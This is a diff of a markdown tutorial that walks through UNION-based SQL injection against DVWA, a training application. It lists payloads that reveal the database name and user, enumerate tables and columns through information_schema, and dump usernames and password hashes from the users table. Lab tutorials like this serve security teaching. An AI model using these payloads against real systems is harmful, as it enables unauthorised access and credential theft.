@@ -19,22 +19,29 @@ After Knowing the Columns present in the data
 ' UNION SELECT database(),user()#
 ```
 You will get the screen below:
+
 ![final1](https://github.com/rahulrbk/Docs/blob/master/pic.png)
-After Knowing the database name and the user name we will find 'TABLE' inside the database.
+
+* After Knowing the database name and the user name we will find 'TABLE' inside the database.
 with the following query:
+
 ```sh
 ' UNION SELECT table_name,table_name FROM information_schema.tables WHERE table.schema="dvwadb"#
 ``` 
+
 ![final2](https://github.com/rahulrbk/Docs/blob/master/pic2.png)
-Now we have to find the information about Column data present in the table with the following query:
+* Now we have to find the information about Column data present in the table with the following query:
+
 ```sh
 ' UNION SELECT column_name,column_name FROM information_schema.columns WHERE table_schema="dvwadb"#
 ```
 ![final3](https://github.com/rahulrbk/Docs/blob/master/pic3.png)
-At this point we can search for the critical information of the target by mentioning the following query:
+* At this point we can search for the critical information of the target by mentioning the following query:
+
 ```sh
 'UNION SELECT user,password FROM users#
 ```
+
 ![final4](https://github.com/rahulrbk/Docs/blob/master/pic4.png)
 
 
